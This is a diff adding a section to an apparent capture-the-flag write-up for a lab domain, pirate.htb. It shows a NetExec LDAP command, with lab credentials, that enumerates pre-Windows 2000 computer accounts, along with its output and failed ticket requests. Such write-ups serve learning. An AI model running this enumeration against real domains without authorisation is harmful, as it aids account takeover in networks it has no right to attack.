@@ -159,5 +159,18 @@ j.sparrow
 
 Ill use `--rid-brute` to also get machine accounts
 
+# Pre 2000 computer accounts
 
+```python
+nxc ldap dc01.pirate.htb -u pentest -p 'p3nt3st2025!&' -M pre2k
+LDAP        10.129.244.95   389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:pirate.htb) (signing:None) (channel binding:Never) 
+LDAP        10.129.244.95   389    DC01             [+] pirate.htb\pentest:p3nt3st2025!& 
+PRE2K       10.129.244.95   389    DC01             Pre-created computer account: MS01$
+PRE2K       10.129.244.95   389    DC01             Pre-created computer account: EXCH01$
+PRE2K       10.129.244.95   389    DC01             [+] Found 2 pre-created computer accounts. Saved to /home/kali/.nxc/modules/pre2k/pirate.htb/precreated_computers.txt
+PRE2K       10.129.244.95   389    DC01             [-] Failed to get TGT for ms01@pirate.htb: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
+PRE2K       10.129.244.95   389    DC01             [-] Failed to get TGT for exch01@pirate.htb: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
+```
+
+After seeing some 
 
